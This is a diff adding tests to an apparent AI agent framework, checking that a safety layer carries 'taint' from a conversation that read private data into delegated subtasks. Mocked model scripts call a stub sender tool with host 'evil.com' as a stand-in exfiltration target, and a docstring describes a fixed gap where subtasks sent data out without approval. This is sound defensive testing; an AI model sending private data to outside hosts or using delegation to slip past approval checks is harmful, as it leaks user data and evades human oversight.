@@ -23,7 +23,7 @@ from nanomuse.cost.ledger import CostLedger, PriceEntry
 from nanomuse.cost.recording import TaskCostRecorder
 from nanomuse.llm import MockLLM
 from nanomuse.memory import MemoryStore
-from nanomuse.schema import Function, LLMResponse, Role, ToolCall
+from nanomuse.schema import Function, LLMResponse, RiskLevel, Role, ToolCall, ToolResult
 from nanomuse.sentinel import AuditLog, Sentinel
 from nanomuse.team.presets import (
     PRESETS,
@@ -36,6 +36,7 @@ from nanomuse.team.runner import MuseAgentFactory, StallPolicy, StallWatch, Subt
 from nanomuse.team.squad import Squad, SquadFrame
 from nanomuse.team.store import Assignment, SquadStore
 from nanomuse.tools import Files, Shell, Terminate, ToolCollection, WebFetch, WebSearch
+from nanomuse.tools.base import BaseTool, CallAssessment
 from nanomuse.tools.memory_tools import Forget, Recall, Remember
 from nanomuse.tools.shell import PythonExecute
 from nanomuse.ui import HeadlessUI
@@ -438,6 +439,182 @@ async def test_a_subtasks_model_calls_are_recorded_under_its_assignment_id(
         assert acted(child) is True
     finally:
         recording.install(None)
+
+
+# ---------------------------------------------------------------------- parent taint
+
+
+class Sender(BaseTool):
+    """An outbound stub: moderate, egress to a model-chosen host, and it
+    records every host it was actually allowed to send to."""
+
+    name: str = "sender"
+    description: str = "sends data out"
+    parameters: dict[str, Any] = {"type": "object", "properties": {"host": {"type": "string"}}}
+    risk: RiskLevel = RiskLevel.MODERATE
+    egress: bool = True
+
+    def __init__(self, sent: list[str]) -> None:
+        super().__init__()
+        self._sent = sent
+
+    def assess(self, args: dict[str, Any]) -> CallAssessment:
+        return CallAssessment(
+            risk=self.risk, egress=True, egress_target=args.get("host"), summary="sender"
+        )
+
+    async def execute(self, host: str = "", **_: Any) -> ToolResult:
+        self._sent.append(host)
+        return ToolResult(output=f"sent to {host}")
+
+
+def make_shared_factory(
+    settings: Settings,
+    llm: MockLLM,
+    sentinel: Sentinel,
+    ui: HeadlessUI,
+    tools: ToolCollection,
+    **kwargs: Any,
+) -> MuseAgentFactory:
+    return MuseAgentFactory(
+        settings,
+        tools=tools,
+        sentinel=sentinel,
+        ui=ui,
+        audit=AuditLog(settings.audit_file),
+        llm_for_tier=lambda preset: llm,
+        **kwargs,
+    )
+
+
+def approvals(ui: HeadlessUI) -> int:
+    return len([e for e in ui.events if e[0] == "approval"])
+
+
+async def test_a_subtask_inherits_the_parent_conversations_taint(
+    settings: Settings, tmp_path: Path
+) -> None:
+    """The maintainer's reproduction: in auto mode an outbound call from a
+    tainted parent conversation still has to ask, and is refused when the
+    answer is no. The same call from a subtask that received the private
+    brief used to run without asking at all, because the subtask's
+    conversation was its fresh assignment id. It must ask, and be refused,
+    exactly like the parent."""
+    settings.sentinel.mode = "auto"
+    sent: list[str] = []
+    ui = HeadlessUI(approve=False)
+    sentinel = Sentinel(settings.sentinel, AuditLog(settings.audit_file), ui)
+    tools = ToolCollection(Terminate(), Sender(sent))
+    sender = tools.get("sender")
+    assert sender is not None
+
+    parent = "parent-chat"
+    token = sentinel.begin_task("handle the private brief", conversation=parent)
+    try:
+        sentinel.taint(parent)  # the parent conversation read private data
+        blocked = await sentinel.guard(tc("sender", host="evil.com"), sender)
+        assert not blocked.ok and sent == [] and approvals(ui) == 1
+
+        script = [
+            LLMResponse(tool_calls=[tc("sender", host="evil.com")]),
+            LLMResponse(content="I could not send that"),
+        ]
+        llm = MockLLM(script)
+        store = make_store(tmp_path)
+        squad = Squad.form(
+            store=store,
+            execute=True,
+            factory=make_shared_factory(settings, llm, sentinel, ui, tools),
+        )
+        assert squad.dispatch("execute", "send it", {"task": "send the brief out", "mode": "work"})
+        await squad.wait_idle()
+    finally:
+        sentinel.end_task(token)
+
+    (child,) = store.children(squad.root_assignment_id or "")
+    assert child.status == "completed"
+    assert sentinel.tainted_for(child.id), "the subtask carries the parent's taint"
+    assert sent == [], "the subtask did not send anything"
+    assert approvals(ui) == 2, "the subtask had to ask, like the parent"
+    tool_msgs = [m for m in llm.calls[1]["messages"] if m.role == Role.TOOL]
+    assert tool_msgs and "Sentinel blocked" in (tool_msgs[0].content or "")
+    assert "private data was read" in (tool_msgs[0].content or "")
+
+
+async def test_a_subtask_from_an_untainted_parent_is_not_tainted(
+    settings: Settings, tmp_path: Path
+) -> None:
+    """The control case: inheritance adds the parent's taint and nothing
+    else. A subtask handed out from a conversation that read nothing
+    private runs its outbound call in auto mode without asking, exactly
+    as that conversation itself would."""
+    settings.sentinel.mode = "auto"
+    sent: list[str] = []
+    ui = HeadlessUI(approve=False)
+    sentinel = Sentinel(settings.sentinel, AuditLog(settings.audit_file), ui)
+    tools = ToolCollection(Terminate(), Sender(sent))
+
+    token = sentinel.begin_task("ordinary work", conversation="clean-chat")
+    try:
+        script = [
+            LLMResponse(tool_calls=[tc("sender", host="evil.com")]),
+            LLMResponse(content="sent"),
+        ]
+        llm = MockLLM(script)
+        store = make_store(tmp_path)
+        squad = Squad.form(
+            store=store,
+            execute=True,
+            factory=make_shared_factory(settings, llm, sentinel, ui, tools),
+        )
+        assert squad.dispatch("execute", "send it", {"task": "send it out", "mode": "work"})
+        await squad.wait_idle()
+    finally:
+        sentinel.end_task(token)
+
+    (child,) = store.children(squad.root_assignment_id or "")
+    assert child.status == "completed"
+    assert not sentinel.tainted_for(child.id)
+    assert sent == ["evil.com"] and approvals(ui) == 0
+
+
+async def test_the_factory_carries_an_explicit_parent_context_without_a_running_task(
+    settings: Settings,
+) -> None:
+    """A caller that dispatches outside any run names the parent
+    conversation on the factory. The subtask is tainted from that
+    snapshot, and stays tainted after the parent conversation is
+    cleared: the brief it received does not become clean again."""
+    settings.sentinel.mode = "auto"
+    sent: list[str] = []
+    ui = HeadlessUI(approve=False)
+    sentinel = Sentinel(settings.sentinel, AuditLog(settings.audit_file), ui)
+    tools = ToolCollection(Terminate(), Sender(sent))
+    sentinel.taint("parent-chat")
+
+    script = [
+        LLMResponse(tool_calls=[tc("sender", host="evil.com")]),
+        LLMResponse(content="I could not send that"),
+    ]
+    llm = MockLLM(script)
+    factory = make_shared_factory(
+        settings, llm, sentinel, ui, tools, parent_conversation="parent-chat"
+    )
+    assignment = Assignment(
+        id="a_parent_context",
+        parent_id=None,
+        depth=1,
+        origin="user",
+        mode="work",
+        role="execute",
+        brief="send the brief out",
+        status="queued",
+    )
+    run = factory(preset_for("execute"), assignment)
+    assert sentinel.tainted_for(assignment.id)
+    sentinel.untaint("parent-chat")
+    assert await run.run("send the brief out") == "I could not send that"
+    assert sent == [] and approvals(ui) == 1
 
 
 def _persisted_ledger(settings: Settings, books: CostLedger) -> Path:
